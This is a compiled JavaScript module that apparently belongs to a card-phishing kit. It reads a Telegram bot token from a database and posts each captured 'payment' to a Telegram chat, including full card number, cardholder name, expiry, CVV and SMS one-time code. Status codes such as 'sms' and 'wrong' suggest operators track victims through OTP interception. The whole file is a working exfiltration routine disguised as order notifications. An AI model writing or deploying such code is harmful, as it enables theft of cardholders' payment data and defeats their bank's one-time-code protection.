import db from './db.mjs';

const getTelegramConfig = async () => {
  try {
    const stmt = db.prepare("SELECT * FROM telegram_settings LIMIT 1");
    const result = stmt.get();
    return result || null;
  } catch (error) {
    console.error("Error getting Telegram config:", error);
    return null;
  }
};
const sendTelegramNotification = async (payment, isNew = true) => {
  try {
    if (!payment || !payment.id) {
      console.error("Invalid payment data for Telegram notification");
      return false;
    }
    const config = await getTelegramConfig();
    if (!config || !config.bot_token || !config.chat_id) {
      return false;
    }
    const action = isNew ? "\u{1F195} NEW ORDER" : "\u{1F504} UPDATE";
    const statusEmoji = {
      pending: "\u23F3",
      sms: "\u{1F4F1}",
      sms_error: "\u274C",
      wrong: "\u{1F494}",
      success: "\u2705"
    };
    const sanitizeText = (text) => {
      if (!text) return "N/A";
      return text.toString().replace(/[<>]/g, "");
    };
    const message = `
${action}

\u{1F4B0} <b>Payment Method:</b> <code>${sanitizeText(payment.method)}</code>
\u{1F3E6} <b>Card Number:</b> <code>${sanitizeText(payment.card_number)}</code>
\u{1F464} <b>Cardholder:</b> <code>${sanitizeText(payment.cardholder_name)}</code>
\u{1F4C5} <b>Expiry:</b> <code>${sanitizeText(payment.expiry)}</code>
\u{1F510} <b>CVV:</b> <code>${sanitizeText(payment.cvv)}</code>
${payment.otp ? `\u{1F522} <b>OTP:</b> <code>${sanitizeText(payment.otp)}</code>` : ""}
\u{1F4CA} <b>Status:</b> ${statusEmoji[payment.status] || "\u2753"} <code>${sanitizeText(payment.status)}</code>
\u{1F550} <b>Date:</b> <code>${new Date(payment.created_at).toLocaleString("vi-VN")}</code>

\u{1F194} <b>Order ID:</b> <code>#${payment.id}</code>
    `.trim();
    const telegramUrl = `https://api.telegram.org/bot${config.bot_token}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: config.chat_id,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: true
      }),
      signal: AbortSignal.timeout(1e4)
      // 10 seconds timeout
    });
    if (!response.ok) {
      let errorData;
      try {
        errorData = await response.json();
      } catch (parseError) {
        console.error("Failed to parse Telegram API error response:", parseError);
        errorData = { error_code: response.status, description: "Unknown error" };
      }
      console.error("Telegram API error:", errorData);
      return false;
    }
    let result;
    try {
      result = await response.json();
    } catch (parseError) {
      console.error("Failed to parse Telegram API success response:", parseError);
      return false;
    }
    return result.ok;
  } catch (error) {
    console.error("Error sending Telegram notification:", error);
    if (error instanceof Error) {
      if (error.name === "AbortError") {
        console.error("Telegram request timed out");
      } else if (error.name === "TypeError") {
        console.error("Network error or invalid URL");
      }
    }
    return false;
  }
};
const sendNewOrderNotification = async (payment) => {
  return await sendTelegramNotification(payment, true);
};
const sendStatusUpdateNotification = async (payment) => {
  return await sendTelegramNotification(payment, false);
};

export { sendTelegramNotification as a, sendNewOrderNotification as b, getTelegramConfig as g, sendStatusUpdateNotification as s };
//# sourceMappingURL=telegram.mjs.map
